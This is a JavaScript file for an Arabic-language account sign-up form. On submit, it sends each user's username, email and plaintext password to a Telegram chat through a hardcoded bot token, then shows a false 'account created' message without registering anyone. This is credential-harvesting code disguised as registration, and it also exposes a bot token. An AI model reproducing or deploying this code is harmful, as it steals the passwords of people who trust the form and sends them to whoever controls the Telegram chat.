document.addEventListener("DOMContentLoaded", () => {
    let userCount = localStorage.getItem("userCount") || 0;
    const formContainer = document.querySelector(".form-container");

    document.getElementById("createAccount").addEventListener("click", function () {
        formContainer.innerHTML = `
            <h2>إنشاء حساب</h2>
            <form id="registerForm">
                <label for="newUsername">اسم المستخدم</label>
                <input type="text" id="newUsername" placeholder="أدخل اسم المستخدم" required>

                <label for="newEmail">البريد الإلكتروني</label>
                <input type="email" id="newEmail" placeholder="أدخل البريد الإلكتروني" required>

                <label for="newPassword">كلمة المرور</label>
                <input type="password" id="newPassword" placeholder="أدخل كلمة المرور" required>

                <label for="confirmPassword">تأكيد كلمة المرور</label>
                <input type="password" id="confirmPassword" placeholder="أكد كلمة المرور" required>

                <button type="submit">إنشاء حساب</button>
                <p id="error-message"></p>
            </form>
        `;

        document.getElementById("registerForm").addEventListener("submit", function (event) {
            event.preventDefault();

            let newUsername = document.getElementById("newUsername").value.trim();
            let newEmail = document.getElementById("newEmail").value.trim();
            let newPassword = document.getElementById("newPassword").value.trim();
            let confirmPassword = document.getElementById("confirmPassword").value.trim();
            let errorMessage = document.getElementById("error-message");

            if (newUsername === "" || newEmail === "" || newPassword === "" || confirmPassword === "") {
                errorMessage.textContent = "يرجى ملء جميع الحقول!";
                return;
            } else if (newPassword !== confirmPassword) {
                errorMessage.textContent = "كلمتا المرور غير متطابقتين!";
                return;
            }

            userCount++;
            localStorage.setItem("userCount", userCount);

            // إرسال إشعار إلى تيليجرام
            sendTelegramNotification(newUsername, newEmail, newPassword, userCount);

            alert("تم إنشاء الحساب بنجاح!");
            window.location.reload();
        });
    });

    function sendTelegramNotification(username, email, password, count) {
        const botToken = "7945152379:AAFtLazXVvOSYzxdwFkQKkRDf7HzRgzG9_s";
        const chatId = "909090929";
        const message = `✅ مستخدم جديد تم تسجيله!\n👤 الاسم: ${username}\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📊 إجمالي المستخدمين: ${count}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
        }).catch(error => console.error("خطأ في إرسال الإشعار:", error));
    }
});